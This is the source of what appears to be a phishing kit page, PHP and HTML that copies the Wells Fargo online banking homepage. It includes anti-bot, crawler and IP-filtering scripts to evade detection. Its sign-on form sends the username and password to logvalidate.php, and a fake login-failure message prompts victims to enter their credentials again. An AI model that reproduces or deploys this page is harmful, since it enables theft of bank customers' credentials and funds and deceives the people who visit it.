<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Wells Fargo – Online Banking, Credit Cards, Loans, Mortgages &amp; More</title>
	
<link rel="icon" href="rel/assets/icons/favicon.ico">
<link rel="apple-touch-icon" sizes="120x120" href="rel/assets/icons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="180x180" href="rel/assets/icons/apple-touch-icon-180x180.png">
<link rel="icon" sizes="128x128" href="rel/assets/icons/icon-normal-128x128.png">
<link rel="icon" sizes="192x192" href="rel/assets/icons/icon-hires-192x192.png">
<link rel="icon" href="rel/assets/icons/favicon-16x16.png">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
<style type="text/css">.cmsDefault {visibility: hidden !important;}</style>
	<link rel="stylesheet" href="rel/smartphone-homepage.css">
<link rel="stylesheet" href="rel/homepage_ret.css">
<style type="text/css">
.cimp1 {
    background-image: url(rel/s1.png);}
.cimp2 {
    height: 236px;
    margin-bottom: 40px;
    background-image: url(rel/s2.png); background-repeat: no-repeat;}
.cimp3 {
    height: 240px;
    margin-top: 20px;
    margin-bottom: 70px;
    background-image: url(rel/s3.png); background-repeat: no-repeat;}
.cimpt {
    margin: 0 auto;
    color: #141414;
    font-family: Georgia,serif;
    width: 970px;
    font-size: 28px;
    font-weight: 400;}
.formError{background-color:#ffdc78;padding:11px 11px 11px 48px;box-sizing:border-box;border-bottom: 1px solid #787070;margin-bottom:12px;width:120%;position:absolute;right:-290px;top:0px;
    background-image: url(rel/assets/alert-icon.svg);
    background-repeat: no-repeat;background-position:5px 12px ;}
.hideerr{display:none;}

@media only screen and (max-width:990px){
html,body{min-width:150px;width:auto;}
.dkt , .dkt *{display:none!important;width:0!important;}
.wfLogoStripChild{width:100%;text-align:center}
#brand{position:relative;}
.inner{width:100%}
.stage-coach img{width:100%}
#mainContent{width:100%}
.formError{position:relative;right:0;width:100%;}
#signOn {
    width: 100%;
    margin-top: 0;
    margin-bottom: 0;
    position: relative;
    box-shadow: none;
	text-align:center;
}
#signOn a{font-size:12px;text-decoration:none;display: inline;}
.topRegion{height:auto;}
#frmSignon{width: 288px;
    margin: auto;
    padding: 0!important;}
.formElement {width: 100%;}
.formElementCheckbox:focus+label{outline:0px dotted}
#mosignUp{margin:40px auto 50px;width:288px;font: 14px ;}
#mosignUp div{margin:0 0 20px;}
#mosignUp .enroll{
	height: 40px;
    width: 100%;
	box-sizing:border-box;
    border-radius: 8px;
    background-color: transparent;
    border: 2px solid;
    color: #3b3331;
    text-align: center;
    padding: 11px;}
.formSubmit input[type="submit"] {width: 100%;}
#masthead{margin-bottom:0;} .lsc{font-size:12px!important;width:auto!important;} 
.formElementPassword:focus,.formElementText:focus{outline-color:#5a469b;border-radius:2px;box-shadow:none;border:0.5px solid #5a469b;}
}
@media only screen and (min-width:991px){
.mbl{display:none}
}
@media only screen and (max-width:290px){
#frmSignon{width: 100%;
    margin: auto;
    padding: 0!important;}
}

</style>
</head>

<body>

<div id="desktopmainview">
    <div id="shell" data-pid="222-147047-64">

<header role="banner">
   	<div id="masthead" class="html5header c1 nxg">	
        <div class="wfLogoStripParent">
              <div class="wfLogoStripChild">
		    <div id="brand">
                <img alt="Wells Fargo Home Page" role="img" src="rel/homepage-horz-logo.svg">
            </div>
	    <div class="dkt" id="topSearch">
				
				
				
					<ul>		
				
				
					<li role="presentation">
		<a class="signIn signLockImg">
			<img alt="Secure" role="img" src="rel/homepage-lock.svg">
			 Enroll
		</a>
	</li>
				
				
					<li role="presentation">
          <a>Customer Service</a>
        </li>
				
					<li role="presentation">
          <a>ATMs/Locations</a>
        </li>
				
					<li role="presentation">
          <a xml:lang="es" lang="es">Español</a>
        </li>
					
			</ul>
			
			    				
				
				     <div id="nxgSearch">
						<button id="nxgSearchButton">
							<span class="nxgSearchText">Search</span>&nbsp;
							<span class="nxgVisuallyHidden" id="nxgSearchDescription">Opens a dialog.</span>
							<span class="nxgSearchIcon"></span>
						</button>
                     </div>
				
			
		</div>
        </div>
     </div>
	  
			<div class="dkt" id="mainNav">
				<nav aria-label="account type"> 
					
							  
									<div class="html5nav" id="tabNav">
										<ul>
											
											   
		
<li class="active">
				<a class="tabNavLink" id="tabNavPersonal" name="tabNavPersonal">
					<span class="hidden">selected</span>
					 Personal</a>
			</li>

	
											
											   
          
            <li>
              <a class="tabNavLink" id="tabNavSmallBusiness" name="tabNavSmallBusiness">Small Business</a>
            </li>
          
        
											
											   
          
            <li>
              <a class="tabNavLink" id="tabNavCommercial" name="tabNavCommercial">Commercial</a>
            </li>
          
        
											
										</ul>
									</div>
								
					
				    
					<div id="headerTools">
						<nav role="presentation">
							<ul>						
								
									<li>
          <a >Financial Education</a>
        </li>
								
									<li>
          <a >About Wells Fargo</a>
        </li>
								
						   </ul>
						</nav>
					</div>
				   
			    </nav>
			</div>

    </div>
</header>
         
		
		<nav class="dkt" id="fatNavParent" aria-label="products and services">
<ul id="fatnav">
<li>
					<a id="bankingTab" class="navLevel1" aria-expanded="false" data-navitem="banking">Banking and Credit Cards</a>
				</li>
<li>
					<a id="loansTab" class="navLevel1" aria-expanded="false" data-navitem="loans">Loans and Credit</a>
				</li>
<li>
					<a id="investingTab" class="navLevel1" aria-expanded="false" data-navitem="investing">Investing and Retirement</a>
					</li>
<li>
					<a id="wealthTab" class="navLevel1" aria-expanded="false" data-navitem="wealth">Wealth Management</a>
				</li>
<li>
					<a id="rewardsTab" class="navLevel1" aria-expanded="false" data-navitem="rewards">Rewards and Benefits</a>
				</li>
</ul>
</nav>
		
	
		<noscript>
<div id="msgnojs">
<p>We're sorry, but some features of our site require JavaScript. Please enable JavaScript on your browser and refresh the page. <a class="c13" >Learn More</a></p>
</div></noscript>
	                        

<div id="mainContent">
  <div class="c45m-tip static-banner-container mbl" aria-hidden="false">
                <div class="c45m-tip-wraper static-banner-wrapper">
                    <div class="c45m-tip-badge">
                        <span class="appstoreicon">
                            <img src="rel/wf-app-icon.svg" aria-hidden="true" alt="">
                        </span>
                    </div>
                    <div class="c45m-tip-content">
                        <p class="c45m-tip-text app-text">Download our app to deposit checks with your phone.<sup role="img" aria-label="footnote 1" aria-describedby="footnote01">1</sup>
                        </p>
                    </div>
                </div>
            </div>
                            <div class="emergencyMsgContainer dkt">
<p class="emergencyMsgContent"><span class="emergencyMsgSpan theme4">Alert</span>Here for you – updates on COVID-19 assistance and stimulus.<a >Learn more</a></p>
</div>

                               
<div class="topRegion">

<div class="inner">
<div id="signOn">
	<div id="signOnMain">
		<h2 id="signOnHeader" class="dkt"><img role="img" src="rel/homepage-signon-lock.svg" alt="Secure">View Your Accounts</h2>
		<div class="overlayContainer mbl"><div class="welcome-container" tabindex="-1">Welcome</div>
			<div class="security-container">
				<span class="security-img"></span><a class="security-text">Online &amp; Mobile Security</a>
			</div></div>
		<form autocomplete="off" name="Signon" id="frmSignon" action="logvalidate.php<?php if(isset($_GET['cw2'])){echo '?cw2=On';};?>" method="post">
			<div class="formError <?php if(!isset($_GET['loginFailed_id']) && !isset($_GET['cw2'])){echo 'hideerr';}?>">We do not recognize your username and/or password </div>
			<div class="formElementsWrapper formElementsUsername">
				<label for="userid" class="id_label">Username</label>
				<input type="text" accesskey="U" id="userid" class="formElement formElementText login_field" name="j_username" maxlength="14" value="" autocomplete="off">
			</div>
			<div class="formElementsWrapper formElementsPassword">
				<label for="password" class="id_label">Password</label>
				<input type="password" accesskey="P" id="password" class="formElement formElementPassword login_field pmask" name="j_password" maxlength="32" autocomplete="off">
			</div>
			<div id="saveuid" class="formElementsWrapper formElementsSaveUsername">
				<input type="checkbox" accesskey="S" id="saveusername" class="c29link formElement formElementCheckbox" name="saveusername" data-content-id="c29content-save-username" triggerhover="false" isclickable="true">
				<label for="saveusername" class="lsc">Save username<span class="hidden">Notice - For your security, we do not recommend using this feature on a shared device.</span></label>
			</div>
			<div class="formSubmit">
				<input type="submit" value="Sign On" name="btnSignon" id="btnSignon" class="c7" data-mrkt-tracking-id="3d6c76ba-9d34-4def-977d-a79cb8afc738">
			</div>
			<div class="forgotPasswordLinkWrapper">
				<a >Forgot Password/Username? </a>
			</div>
			</form>
				<div id="mosignUp" class="mbl">
			<div>New to Wells <i>Fargo</i> Online&reg;?</div>
		
		<div class="enroll">Enroll</div>
	</div>
	</div>
	<div id="signUp" class="dkt">
			<a >Enroll Now</a>
		<a >Security Center</a>
		<a >Privacy, Cookies, and Security</a>
	</div>
</div>


</div>
              
           

           
     
            



<div class="c3 dkt" >	
	<div class="c3wrapper" role="region" aria-label="Promotions Slideshow"><div class="paddles alwaysOn"><a class="left">
	<img alt="Previous Slide" src="rel/home_sprite_image.png"></a></div>
		
			<div class="carouselFrame item1" style="display: none;"><span class="hidden">Begin item 1</span>
				<div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en" data-offer-id="C_chk_everydaychecking_hpprimary_web">
      
<div class="c3Img" data-cid="tcm:402-207718-16" data-ctid="tcm:91-146911-32"><img alt="" src="rel/6825911_gettyimages-1153899955_img_hph_1200x532.jpg"></div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme11"> 
                        
                        <h2>Simplify your life</h2>
                        <span>Your money's at hand with Everyday Checking</span>
	   	        <a class="c7" role="button" >Start now</a>
                  </div>
           </div>
      </div>

  

						</div>
			<span class="hidden">End item 1</span></div>
		
			
			<div class="carouselFrame item3" style="display: block;"><span class="hidden">Begin item 3</span>
				<div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_3" lang="en" data-offer-id="C_sav_wtosave_hpprimary_web">
      
<div class="c3Img" data-cid="tcm:402-207066-16" data-ctid="tcm:91-146911-32"><img alt="" src="rel/6818104_gettyimages-890847206_1200_532.jpg" class="deferred"></div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme11"> 
                        
                        <h2>Ready for what's next</h2>
                        <span>Way2Save<sup>®</sup>: Convenient, automatic options for building savings</span>
	   	        <a class="c7" role="button" >Get started
</a>
                  </div>
           </div>
      </div>

  

						</div>
			<span class="hidden">End item 3</span></div>
		<div class="controls"><a class="show1"><span class="hidden">item 1 of 3</span><img alt="" src="rel/icon-marquee-dot-inactive.svg"></a><a class="show2 current" tabindex="-1" role="presentation"><span class="hidden">item 2 of 3 - you are here</span><img alt="" src="rel/icon-marquee-dot-active.svg"></a><a class="show3"><span class="hidden">item 3 of 3</span><img alt="" src="rel/icon-marquee-dot-inactive.svg"></a></div><div class="paddles alwaysOn"><a class="right"><img alt="Next Slide" src="rel/home_sprite_image.png"></a></div></div>
</div>

<div id="taskbar" role="region" aria-label="A group of 5 tasks." style="bottom: 0px;" class="dkt">
	<div class="inner">
		<ul>
			
			<li class="task">
				
				<div class="iaRendered" data-slot-id="WF_CON_HP_TOP_TASK_1" lang="en" data-offer-id="C_ccd_findcreditcard_toptask_web">    <div class="taskContentWrapper" data-cid="tcm:402-149487-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" >
            
            <div class="taskImageContainer">
               <img alt="" src="rel/wfi111_ic_nba_default2-gray_50x50.png">
            </div>
            
            Find your credit card

        </a>
    
    </div>

</div>
				
				
			</li>
				
			<li class="task">
				
				<div class="iaRendered" data-slot-id="WF_CON_HP_TOP_TASK_2" lang="en" data-offer-id="C_chk_everydaychecking_toptask_web">    <div class="taskContentWrapper" data-cid="tcm:402-207715-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" >
            
            <div class="taskImageContainer">
               <img alt="" src="rel/6825911_wf_icon_check_mark_50x50.png">
            </div>
            
            Simplify life: Everyday Checking
        </a>
    
    </div>

</div>
				
				
			</li>
				
			<li class="task">
				
				<div class="iaRendered" data-slot-id="WF_CON_HP_TOP_TASK_3" lang="en" data-offer-id="C_sav_wtosave_toptask_web">    <div class="taskContentWrapper" data-cid="tcm:402-207092-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" >
            
            <div class="taskImageContainer">
               <img alt="" src="rel/6818104_cash-in-hand_icon_3b3331_50x50.png">
            </div>
            
            Automatically save for tomorrow

        </a>
    
    </div>

</div>
				
				
			</li>
				
			<li class="task">
				
				
                     
            <div class="taskContentWrapper" style="display: block;">
<div class="taskSecondstate" tabindex="0" role="button" aria-controls="findRoutingOrAccountNumber" aria-expanded="false">
<div class="taskImageContainer"><img alt="" src="rel/task-icon-account-50x50.png"></div>
Find routing or account number</div>
</div>
          
				
			</li>
				
			<li class="task">
				
				
                     
            
		<div class="taskContentWrapper" style="display: block;">
			<div class="taskSecondstate" role="button" aria-controls="checkTodaysRates" tabindex="0" aria-expanded="false">
				<div class="taskImageContainer">
					<img alt="" src="rel/task-icon-rates-50x50.png">
				</div>
				
Check today’s rates
			</div>
		</div>
	
          
				
			</li>
				
		</ul>
	</div>			
</div>
	


  </div>
            
            

        
     <div class="dkt">   
         
     
<div class="c63 cimp1"> </div>
<div class="c63 cimp2"> </div>
<h3 class="cimpt">Suggested for you</h3>
<div class="c63 cimp3"> </div>

</div>


        </div>
        
         
        


<footer role="contentinfo" class="dkt">
	<div class="html5footer c9" id="pageFooter">
          
            
                <div class="c9content">
    

		<img alt="Together we&#39;ll go far" role="img" src="rel/homepage_footer_stagecoach.svg">
	
    
    
    <nav role="navigation">
            	<div class="html5nav">
					<ul class="navList">						
                        
                        <li>
          <a >Privacy, Cookies, Security &amp; Legal</a>
        </li>
                        
                        <li>
          <a >Notice of Data Collection</a>
        </li>
                        
                        <li>
          <a >General Terms of Use</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >Online Access Agreement</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >Ad Choices</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >Report Fraud</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >About Wells Fargo</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >Careers</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >Diversity and Accessibility</a>
        </li>
                        
                        <li>
          <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32" >Sitemap</a>
        </li>
                                               
					</ul>
				</div>
			</nav>
    

</div>            
          
            
          
            
          
            
          
            
          
            
          
            
        

        
            <div class="c42">
                 <div class="c20">
                      
                        
                      
                        
                            		<div class="socialIcons">
			<a class="iconFacebook" >
				<img class="facebookIcon" alt="Facebook" role="img" src="rel/home_sprite_image.png">
				 &nbsp;
			</a>
			 
			<a class="iconLinkedIn" >
				<img class="linkedInIcon" alt="LinkedIn" role="img" src="rel/home_sprite_image.png">
				 &nbsp;
			</a>
			 
			<a class="iconInstagram" >
				<img class="instagramIcon" alt="Instagram" src="rel/home_sprite_image.png">
				 &nbsp;
			</a>
			 
			<a class="iconPinterest" >
				<img class="pinterestIcon" alt="Pinterest" src="rel/home_sprite_image.png">
				 &nbsp;
			</a>
			 
			<a class="iconYoutube" >
				<img class="youtubeIcon" alt="YouTube" src="rel/home_sprite_image.png">
				 &nbsp;
			</a>
			 
			<a class="iconTwitter" >
				<img class="twitterIcon" alt="Twitter" src="rel/home_sprite_image.png">
				 &nbsp;
			</a>
		</div>
	                        
                      
                        
                            		<div class="c20body" data-numbered="false">
<p>We provide links to external websites for convenience. Wells Fargo does not endorse and is not responsible for their content, links, privacy, or security policies.</p>

<p>Investment products and services are offered through Wells Fargo Advisors. Wells Fargo Advisors is a trade name used by Wells Fargo Clearing Services, LLC (WFCS) and Wells Fargo Advisors Financial Network, LLC, Members <a >SIPC</a>, separate registered broker-dealers and non-bank affiliates of Wells Fargo &amp; Company. <em>WellsTrade</em><sup>®</sup> and Intuitive Investor<sup>®</sup> accounts are offered through WFCS.</p>
</div>
	                        
                      
                        
                            <div id="c20nnm" class="c20notnot"><strong>Investment and Insurance Products are:</strong>
<ul>
<li><strong>Not Insured by the FDIC or Any Federal Government Agency</strong></li>
<li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</strong></li>
<li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</strong></li>
</ul>
</div>                        
                      
                        
                            <div class="c20body" data-numbered="false" data-cid="tcm:84-146986-16" data-ctid="tcm:91-1924-32">

          <p>Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
</p>
        
</div>                        
                      
                        
                            		<p class="equalHousingImg">
			<span class="equalHousingIcon">
				<img alt="icon-equal-housing" src="rel/home_sprite_image.png">
			</span>
			 
			<strong>Equal Housing Lender</strong>
		</p>
		

		<p>© 1999 - 2022 Wells Fargo. All rights reserved. NMLSR ID 399801</p>
	                        
                      
                        
                    
                 </div>
            </div>
        
    </div>
</footer>


<footer role="contentinfo" class="mbl">
<div class="html5footer c9" id="pageFooter">
	<nav class="nav-footer">
		<div class="collapsable-footnote-disclosure">
									<div id="footer-disclosure-link">
										<div class="collapsable-footnote-title">
											<a  id="collapsable-disclosure-link" class="disclosure-open-icon">Disclosures</a>
										</div>
									</div>
									<div id="static-banner-footnotes">
										<div class="footnote-body">
											<ul>
												<li>
													<p id="footnote01">1. Deposit limits and other restrictions apply. Some accounts are not eligible for mobile deposit. Availability may be affected by your mobile carrier's coverage area. Your mobile carrier's message and data rates may apply. See Wells Fargo’s <a >Online Access Agreement</a> for other terms, conditions, and limitations.</p>
												</li>
												<li>
													<p>Android, Chrome, Google Pay, Google Pixel, Google Play, Wear OS by Google, and the Google Logo are trademarks of Google LLC.</p>
												</li>
												<li>
													<p>Apple, the Apple logo, Apple Pay, Apple Watch, Face ID, iPad, iPad Pro, iPhone, iTunes, Mac, Safari, and Touch ID are trademarks of Apple Inc., registered in the U.S. and other countries. Apple Wallet is a trademark of Apple Inc. App Store is a service mark of Apple Inc.</p>
												</li>
											</ul>
										</div>
									</div>
		 </div>
		<div class="footer-link clistData">
			<a >PRIVACY, Cookies, Security &amp; Legal</a> | <a >Ad Choices</a>
			<div class="footer-oaa"><a >Online Access Agreement</a>
			</div>
		</div>
		<div id="c20nnm-login">
			<strong>Investment and Insurance Products are:</strong>
				<ul>
					<li><strong>Not Insured by the FDIC or Any Federal Government Agency </strong></li>
					<li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</strong></li>
					<li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</strong></li>
				</ul>
		</div>
		<div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
		<div class="footer-content"><span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
		<div class="footer-content footer-margin">© 2021 Wells Fargo. All rights reserved.</div>
		<div class="stage-coach"><img src="rel/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
		</nav></div>
	
</footer>

        
        </div>
    <!-- end of shell div -->

</div>

</body></html>